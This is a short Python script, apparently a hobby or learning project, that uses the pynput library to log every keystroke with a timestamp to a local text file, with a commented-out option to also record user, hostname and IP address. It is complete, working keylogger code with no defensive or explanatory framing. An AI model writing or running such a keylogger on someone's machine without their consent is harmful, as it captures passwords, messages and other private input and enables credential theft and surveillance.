from pynput.keyboard import Key, Listener
import logging


FORMAT = '%(asctime)s %(message)s'
# FORMAT = '%(asctime)s # %(user)s # %(hostname)s # %(ip)s # %(message)s'

logging.basicConfig(
    filename = ("keyboardlogger.txt"), 
    level = logging.DEBUG, 
    # format = '%(asctime)s %(message)s'
    format = FORMAT
    )

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
        # print('dev ==>', listener)
        listener.join()